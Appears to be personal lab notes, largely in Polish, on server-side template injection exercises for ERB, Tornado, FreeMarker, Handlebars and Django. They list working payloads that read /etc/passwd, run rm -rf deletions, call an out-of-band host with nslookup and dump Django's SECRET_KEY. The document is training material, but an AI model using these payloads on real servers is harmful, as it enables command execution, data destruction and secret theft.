attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side. 


test:
${{<%[%'"}}%\ np. w ?message=unfortunately
zwraca blad z nazwa templatki


Serwer z szablonami jest interaktywny/personalizowany w zaleznosci od inputu usera. zmienia zawartość strony dynamicznie na podstawie danych.
Serwer bez szablonów wysyła gotowe pliki bez zmieniania ich na podstawie użytkownika czy danych.



<br><br>
<hr>
<br><br>
<h2>Lab: Basic server-side template injection (plain text context)</h2>
ERB Template - Ruby

1. komunikat z body pojawia sie w URL
2. ?message=unfortunately, the product is out of stock
3. czyli cokolwiek wpiszemy w url, pojawi sie w body.

np. Python Template Ginger: {{7*7}}


W intruderze wychodzi mi taka skladnia:
<%__import__("traceback").format_stack()%> 


Payload all the things: szukamy po edr czyli ruby.
eval na backend = moemy komendy system uzyc
OK:
<%= 7 * 7 %>
<%= system('cat /etc/passwd') %>

final payload:
<%= system('rm -rf /home/carlos/morale.txt') %>


<br><br>
<hr>
<br><br>
<h2>Lab: Basic server-side template injection (code context)</h2>
Tornado template


Login feature: 
Preferred name: whole name, first name, nick
Jak dodamy wpis na blogu, to nasz podpis sie zmienia 'na zywo' w zalenosci od wybranej opcji w feature

POST /my-account/change-blog-post-author-display

original:
blog-post-author-display=nick&csrf=WDy0joK9kQc1xu7M4WS7BAbqTjCrtThM

payload to tornado:
blog-post-author-display=nick}}{{4*4}}

nick: Peter16

payload all the things:
{{os.system('whoami')}}
lub
{%import os%}{{os.system('nslookup oastify.com')}}

final payload test1:
blog-post-author-display=nick}}{{os.system('rm -rf /home/carlos/morale.txt')}} - NIE DZIAla

final payload test2, ktory zaczyna od zaimportowania modulu w pythopnie os:
blog-post-author-display=nick}}{%import os%}{{os.system('rm -rf /home/carlos/morale.txt')}}

<br><br>
<hr>
<br><br>
<h2>Lab: Server-side template injection using documentation</h2>

w opisie produktu mozemy dokonac edycji i na koniec mamy kod:
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.</p>

test:
<p>Hurry! Only ${7*7} left of ${7*7} at ${7*7}.</p>
>49 49 49

probujemy wywolac error zeby dowiedziec sie jaki template 
<p>Hurry! Only ${product.stock} left of ${product.name} at ${product.location}.</p>
>FreeMarker Java template

w nowym produkcie, gdzie kod jest czysty:
${"freemarker.template.utility.Execute"?new()("rm -rf /home/carlos/morale.txt")}

<br><br>
<hr>
<br><br>
<h2>Lab: Server-side template injection in an unknown language with a documented exploit</h2>

affected just first product (how to mohd badruddja - yourube)


robie test, zeby wywlac blad:
${{<%[%'"}}%\


19.8.1 Node.js
Handlebars server-side template injection -> payloads all the things
+ URL encoded w decoderze

<br><br>
<hr>
<br><br>
<h2>Lab: Server-side template injection with information disclosure via user-supplied objects</h2>

This lab is vulnerable to server-side template injection due to the way an object is being passed into the template. This vulnerability can be exploited to access sensitive data. 

error with ${{<%[%'"}}%\
Django 
study documentation and notice that the built-in template tag debug can be called to display debugging information -> payload all the things

{% debug %}
{{settings}}
{{settings.SECRET_KEY}}



<%= system('rm -rf /home/carlos/morale.txt') %>

